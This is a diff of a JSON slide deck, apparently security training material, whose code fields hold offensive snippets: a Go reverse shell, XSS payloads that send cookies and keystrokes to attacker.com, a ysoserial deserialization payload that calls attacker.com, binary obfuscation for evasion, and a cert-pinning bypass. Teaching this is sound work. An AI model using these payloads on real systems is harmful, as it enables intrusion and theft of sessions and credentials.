+      "id": "c6e21d9a-080f-4fb7-b3b6-d58179f66244",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -879,6 +1124,10 @@
         "Standard library covers most networking needs without external deps",
         "Used by real-world C2s: Sliver, Merlin, Havoc (partially)"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Cross-compile\nGOOS=windows GOARCH=amd64 go build -o tool.exe main.go\nGOOS=linux   GOARCH=amd64 go build -o tool     main.go\n\n# Strip debug info and reduce binary size\ngo build -ldflags=\"-s -w\" -o tool main.go\n\n# Obfuscate variable/function names (evasion)\n# garble: https://github.com/burrowers/garble\ngarble -literals build -o tool main.go",
       "codeLang": "bash",
       "imageUrl": "",
@@ -886,6 +1135,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -893,7 +1143,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "693020da-1744-4cd8-85ae-e72984854e5a",
+      "id": "bd731b2e-0972-440d-9553-f05e7a6b8046",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -908,6 +1158,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "// Minimal TCP reverse shell skeleton\npackage main\n\nimport (\n    \"net\"\n    \"os/exec\"\n)\n\nfunc main() {\n    conn, _ := net.Dial(\"tcp\", \"10.10.10.10:4444\")\n    cmd := exec.Command(\"/bin/sh\")\n    cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn\n    cmd.Run()\n}",
       "codeLang": "go",
       "imageUrl": "",
@@ -915,6 +1169,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -922,7 +1177,7 @@
       "transition": "fade"
     },
     {
-      "id": "8d6b8452-76c2-4664-8b2e-eab005dc8bb0",
+      "id": "df6319cd-7292-47e4-84a7-34c920dd5c73",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -937,6 +1192,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -944,6 +1203,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -951,7 +1211,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "d32f8945-a64a-4158-8cd3-fdf3e4b3ebb2",
+      "id": "c4966a16-c81e-479c-abeb-c2665b4466a0",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -966,6 +1226,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "// Basic alert proof-of-concept\n<script>alert(document.domain)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\njavascript:alert(1)\n\n// Cookie stealing\n<script>\nfetch('https://attacker.com/steal?c=' + document.cookie)\n</script>\n\n// Keylogger skeleton\ndocument.addEventListener('keydown', e => {\n    fetch('https://attacker.com/log?k=' + encodeURIComponent(e.key))\n})\n\n// DOM-based XSS sink check\nlocation.hash\ndocument.write()\ninnerHTML\neval()\nsetTimeout('code')",
       "codeLang": "javascript",
       "imageUrl": "",
@@ -973,6 +1237,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -980,7 +1245,7 @@
       "transition": "fade"
     },
     {
-      "id": "6cb5c2ee-43a4-4898-abcd-046a1e407833",
+      "id": "75ba0a4c-2068-4e99-b407-66942a14b9a8",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -995,6 +1260,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "// Command injection via child_process\nconst { exec } = require(\"child_process\");\nexec(\"ls \" + userInput); // VULNERABLE — never interpolate user input\n\n// Safe alternative\nconst { execFile } = require(\"child_process\");\nexecFile(\"ls\", [userInput]); // safe — args are not shell-interpreted\n\n// Prototype pollution check\nconst payload = JSON.parse('{\"__proto__\":{\"polluted\":true}}');\nconsole.log({}.polluted); // true if vulnerable merger is used",
       "codeLang": "javascript",
       "imageUrl": "",
@@ -1002,6 +1271,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -1009,7 +1279,7 @@
       "transition": "fade"
     },
     {
-      "id": "48ab6994-79ea-496b-90b3-668a82b9e206",
+      "id": "1df1e302-b1ca-4df9-b10c-a810a784ab17",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -1024,6 +1294,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -1031,6 +1305,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -1038,7 +1313,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "d610476f-2d67-47de-91a0-05475b1502eb",
+      "id": "da224244-6d2b-4525-8c0f-05271932d3bb",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -1053,6 +1328,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Generate payload with ysoserial\njava -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' | base64\n\n# Test with curl\ncurl -s -X POST http://target.com/deser \\\n     -H \"Content-Type: application/octet-stream\" \\\n     --data-binary @payload.bin",
       "codeLang": "bash",
       "imageUrl": "",
@@ -1060,6 +1339,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -1067,7 +1347,7 @@
       "transition": "fade"
     },
     {
-      "id": "02d674c3-758a-4751-9acb-4410e4b8400e",
+      "id": "10a7e45e-10c3-4a80-86b5-d173ea46c834",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -1082,6 +1362,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Decompile APK\napktool d target.apk -o output/\njadx -d jadx_out/ target.apk\n\n# Key files to inspect\noutput/AndroidManifest.xml          # permissions, activities, exported components\noutput/res/values/strings.xml       # hardcoded strings / API keys\njadx_out/sources/com/target/        # decompiled Java source\n\n# Intercept HTTPS (bypass cert pinning)\nfrida -U -f com.target.app -l bypass-ssl.js",
       "codeLang": "bash",
       "imageUrl": "",
@@ -1089,6 +1373,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -1096,7 +1381,7 @@
       "transition": "fade"
     },
     {
-      "id": "49f70ee4-5f30-47fe-929b-b512e8f0388f",
+      "id": "9ffdb00e-0f54-464a-bd17-9762312ea976",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -1111,6 +1396,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -1118,6 +1407,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -1125,7 +1415,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "27e89933-fc04-49f1-9b0b-bafc1e295012",
+      "id": "296368ef-4b91-4dfa-9a36-a18d0fde11f7",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -1144,6 +1434,10 @@
         "godbolt.org — Compiler Explorer, inspect ASM output in real time",
         "codepoints.net — Unicode reference for encoding challenges"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -1151,6 +1445,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -1158,7 +1453,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "04c634bf-b9b4-456e-bea6-4f655f1c6d8a",
+      "id": "bc2ab8a5-0977-45ea-8a09-c7ead3ad50e0",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -1177,6 +1472,10 @@
         "Beej's Guide to C — free, practical C guide",
         "GCC Internals — understand optimisation for RE"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -1184,6 +1483,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -1191,7 +1491,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "57390eea-0a71-4bb8-ae3e-68fad2ddbd0d",
+      "id": "edcb6320-2684-4503-903e-4f142ffe2e42",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -1209,6 +1509,10 @@
         "pwntools docs — official pwntools reference",
         "Python docs — standard library reference"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -1216,6 +1520,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -1223,7 +1528,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "81a28f13-b259-43b8-914c-19a142ce048a",
+      "id": "b1bb0fe6-07c6-4213-9bf2-840405ced150",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -1242,6 +1547,10 @@
         "syscall.sh — Linux syscall table (interactive)",
         "x86.guide — Intel instruction reference"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -1249,6 +1558,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -1256,7 +1566,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "5c28cc24-28dc-42f5-92dc-9327cdf4f9d2",
+      "id": "9de33cf9-9523-4e40-a1ff-e55c1e4ba5a4",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -1275,6 +1585,10 @@
         "PowerSploit — PowerShell offensive framework",
         "PayloadsAllTheThings — PowerShell"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -1282,6 +1596,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -1289,7 +1604,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "35bb4e03-aa6e-4478-9791-96f9701b4ffd",
+      "id": "68e70552-c3e3-4024-a95b-c626e2a5c104",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -1308,6 +1623,10 @@
         "The Rust Book — official Rust learning resource",
         "Awesome Go Security"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -1315,6 +1634,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
